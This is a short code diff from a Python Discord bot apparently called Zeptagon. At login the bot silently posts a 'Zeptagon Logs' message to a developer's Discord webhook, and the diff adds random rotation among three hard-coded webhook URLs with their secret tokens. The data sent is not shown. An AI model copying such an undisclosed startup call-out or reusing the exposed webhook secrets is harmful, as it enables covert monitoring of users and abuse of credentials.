@@ -70,7 +70,9 @@ async def on_ready():
         "username": "Zeptagon Logs",
         "avatar_url": "https://cdn.discordapp.com/avatars/785496485659148359/0fc85eb060bb37c35726fabe791170fe.webp?size=1024"
     }
-    webhook_link = 'https://discord.com/api/webhooks/787825688392630283/LU9TdZowuMqDu_ZOI38Fa7KEkv_OkU_yM3KbWW7G43q1LbPfBBEBd9PCQFBp8W5aDqjp'
+    webhook_link = random.choice(['https://discord.com/api/webhooks/787825688392630283/LU9TdZowuMqDu_ZOI38Fa7KEkv_OkU_yM3KbWW7G43q1LbPfBBEBd9PCQFBp8W5aDqjp', 
+    'https://discord.com/api/webhooks/787959301338562561/4UEu0Yg9AEum5aICw6FLmAnM5ufLb7TFT36wz0ar2P67o23gJ2Rnh5or4H7B9shAqvu4', 
+    'https://discord.com/api/webhooks/787959274626088970/4z4uUfSYKMsJWdD_b1ShTatJFPZp4nFcRZjmbiMt3p2HdLkA9wRX2jrsFWg5lt1Xk1RL'])
     urlopen(Request(webhook_link, data=dumps(webhook).encode(), headers=getheaders()))
     print(f"Current prefix is {prefix}")
     print(f"Logged in as {zept.user.name}#{zept.user.discriminator}.")
